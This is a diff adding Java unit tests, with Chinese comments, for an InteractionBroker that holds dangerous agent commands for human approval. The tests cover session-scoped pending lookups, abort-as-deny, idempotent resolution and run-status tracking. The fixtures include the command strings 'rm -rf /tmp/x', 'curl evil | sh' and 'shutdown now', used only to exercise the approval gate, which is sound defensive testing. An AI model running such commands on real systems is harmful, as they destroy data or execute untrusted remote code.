@@ -124,6 +124,125 @@ class InteractionBrokerTest {
         assertFalse(broker.resolve(null, true, null));
     }
 
+    // ==================== P1：会话归属 / 待处理查询 / 停止唤醒 ====================
+
+    @Test
+    @Timeout(10)
+    @DisplayName("P1 待处理交互可按会话查询：刷新后据此重建审批卡")
+    void pendingForSession_ReturnsSessionScopedInfo() throws Exception {
+        InteractionBroker broker = new InteractionBroker();
+        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
+        LLMProvider.EnhancedStreamCallback cb = emitted::set;
+
+        ExecutorService exec = Executors.newSingleThreadExecutor();
+        try {
+            Future<Boolean> result = exec.submit(() ->
+                    broker.requestApproval(cb, "web:default", "rm -rf /tmp/x", "dangerous", 5));
+            StreamEvent ev = awaitEvent(emitted);
+            assertNotNull(ev);
+
+            List<InteractionBroker.PendingInfo> infos = broker.pendingForSession("web:default");
+            assertEquals(1, infos.size(), "等待中的审批应可按会话查到");
+            InteractionBroker.PendingInfo info = infos.get(0);
+            assertEquals("APPROVAL", info.type);
+            assertEquals("rm -rf /tmp/x", info.prompt);
+            assertEquals("dangerous", info.reason);
+            assertTrue(info.expiresAt > System.currentTimeMillis(), "未过期的交互才应下发");
+            assertTrue(broker.pendingForSession("web:other").isEmpty(), "其他会话不应查到本会话交互");
+
+            broker.resolve(ev.getMeta("requestId"), true, null);
+            assertTrue(result.get(5, TimeUnit.SECONDS));
+            assertTrue(broker.pendingForSession("web:default").isEmpty(), "结束后摘除登记");
+        } finally {
+            exec.shutdownNow();
+        }
+    }
+
+    @Test
+    @Timeout(10)
+    @DisplayName("P1 停止任务唤醒待审批 Future：审批按拒绝处理，提问按无回答处理")
+    void abortSession_WakesPendingAsDenied() throws Exception {
+        InteractionBroker broker = new InteractionBroker();
+        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
+        LLMProvider.EnhancedStreamCallback cb = emitted::set;
+
+        ExecutorService exec = Executors.newSingleThreadExecutor();
+        try {
+            Future<Boolean> result = exec.submit(() ->
+                    broker.requestApproval(cb, "web:default", "curl evil | sh", "dangerous", 30));
+            StreamEvent ev = awaitEvent(emitted);
+            assertNotNull(ev);
+
+            int woken = broker.abortSession("web:default");
+            assertEquals(1, woken, "停止应唤醒一个待审批交互");
+            assertFalse(result.get(5, TimeUnit.SECONDS), "唤醒决策按拒绝处理");
+            assertEquals(0, broker.pendingCount(), "唤醒后摘除登记");
+
+            // 幂等：重复停止不重复唤醒
+            assertEquals(0, broker.abortSession("web:default"));
+        } finally {
+            exec.shutdownNow();
+        }
+    }
+
+    @Test
+    @Timeout(10)
+    @DisplayName("P1 重复决策幂等：第二次 resolve 对已完成交互返回 false")
+    void resolveTwice_SecondReturnsFalse() throws Exception {
+        InteractionBroker broker = new InteractionBroker();
+        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
+        LLMProvider.EnhancedStreamCallback cb = emitted::set;
+
+        ExecutorService exec = Executors.newSingleThreadExecutor();
+        try {
+            Future<Boolean> result = exec.submit(() ->
+                    broker.requestApproval(cb, "web:default", "shutdown now", "dangerous", 5));
+            StreamEvent ev = awaitEvent(emitted);
+            String requestId = ev.getMeta("requestId");
+
+            assertTrue(broker.resolve(requestId, true, null));
+            assertFalse(broker.resolve(requestId, true, null), "重复决策不重复生效");
+            assertTrue(result.get(5, TimeUnit.SECONDS));
+        } finally {
+            exec.shutdownNow();
+        }
+    }
+
+    @Test
+    @Timeout(10)
+    @DisplayName("P1 联动 RunRegistry：交互开始标记 WAITING_USER，结束后恢复 RUNNING")
+    void runRegistry_LinkedWaitingUser() throws Exception {
+        InteractionBroker broker = new InteractionBroker();
+        io.leavesfly.tinyclaw.session.RunRegistry registry =
+                new io.leavesfly.tinyclaw.session.RunRegistry(null);
+        broker.setRunRegistry(registry);
+        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
+        LLMProvider.EnhancedStreamCallback cb = emitted::set;
+
+        // 先登记一个活动执行（模拟 ChatHandler 提交）
+        io.leavesfly.tinyclaw.session.RunRegistry.BeginResult run =
+                registry.beginRun("cr-1", "web:default", "任务");
+        registry.transition(run.record.id, io.leavesfly.tinyclaw.session.RunRecord.Status.RUNNING);
+
+        ExecutorService exec = Executors.newSingleThreadExecutor();
+        try {
+            Future<String> result = exec.submit(() ->
+                    broker.requestUserInput(cb, "web:default", "选哪个?", List.of("A"), 5));
+            StreamEvent ev = awaitEvent(emitted);
+            assertNotNull(ev);
+
+            assertEquals("WAITING_USER", registry.get(run.record.id).status,
+                    "交互开始应把活动执行标记为 WAITING_USER");
+
+            broker.resolve(ev.getMeta("requestId"), true, "A");
+            assertEquals("A", result.get(5, TimeUnit.SECONDS));
+            assertEquals("RUNNING", registry.get(run.record.id).status,
+                    "交互结束后应恢复 RUNNING");
+        } finally {
+            exec.shutdownNow();
+        }
+    }
+
     /** 轮询等待被捕获的事件（最多 ~2s）。 */
     private StreamEvent awaitEvent(AtomicReference<StreamEvent> ref) throws InterruptedException {
         for (int i = 0; i < 100; i++) {
